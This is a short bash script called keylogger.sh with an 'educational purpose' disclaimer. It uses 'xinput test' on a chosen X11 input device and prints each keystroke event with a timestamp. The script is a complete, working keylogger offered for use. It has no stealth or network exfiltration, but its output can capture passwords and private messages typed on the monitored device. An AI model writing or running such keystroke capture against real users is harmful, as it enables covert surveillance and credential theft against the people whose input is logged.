#!/bin/bash
# keylogger.sh
#
# DISCLAIMER:
# This script uses xinput to log key events on X11-based systems.
# Use only on systems where you have explicit permission. ONLY FOR EDUCATIONAL PURPOSE.
#
# Requirements:
#  - X11 with xinput installed.
#
# Usage:
#   sudo ./keylogger.sh <device-id>
#   To list available devices, run: xinput list

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <device-id>"
    echo "Example: sudo $0 10"
    exit 1
fi

DEVICE_ID=$1

echo "Starting keylogger for device ID: ${DEVICE_ID}"
echo "Press Ctrl+C to stop logging..."
xinput test "${DEVICE_ID}" | while IFS= read -r line; do
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $line"
done
